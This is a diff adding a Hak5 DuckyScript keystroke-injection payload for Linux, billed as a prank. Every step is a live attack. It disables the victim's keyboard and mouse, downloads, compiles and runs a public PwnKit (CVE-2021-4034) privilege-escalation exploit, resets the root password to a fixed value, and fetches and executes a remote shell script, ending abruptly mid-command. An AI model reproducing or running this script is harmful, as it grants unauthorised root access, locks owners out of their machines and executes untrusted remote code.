@@ -1,0 +1,62 @@
+REM Title: PwnKit Cred Changer
+REM Author: Alex Lynd
+REM Description: Changes root creds using the PwnKit exploit, disables keyboard / mouse, delivers a devastating rickroll payload.
+REM Target: Linux (Bash)
+REM Props: Hak5, HakCat
+REM Version: 1.0
+REM Category: Prank
+
+CTRL ALT T
+DELAY 1000
+
+REM disable keyboard
+STRING xinput float 10
+ENTER
+
+REM disable mouse
+STRING xinput float 12
+ENTER
+STRING wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
+ENTER
+DELAY 500
+STRING gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
+ENTER
+DELAY 1000
+STRING ./cve-2021-4034-poc
+ENTER
+DELAY 100
+
+REM change root password
+STRING passwd
+ENTER
+STRING meowmeow123
+ENTER
+DELAY 100
+STRING meowmeow123
+ENTER
+DELAY 300
+
+REM jack up volume
+STRING amixer -D pulse sset Master unmute
+ENTER
+REM STRING amixer -D pulse sset Master 100%+
+ENTER 
+
+REM download annoying payload
+STRING wget https://gist.githubusercontent.com/AlexLynd/2f8081f1940934e19a5a450ca358d142/raw/b6d4bfe05cb73f8140872448da54fb1824c4d627/linux-color-flasher.sh
+ENTER
+DELAY 500
+STRING chmod +x linux-color-flasher.sh 
+ENTER
+STRING ./linux-color-flasher.sh &
+ENTER
+DELAY 500
+STRING espeak "you've been hacked loser, its time to get funky"
+ENTER
+DELAY 1000
+STRING firefox "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+ENTER
+DELAY 3000
+SPACE
+DELAY 1000
+STRING F
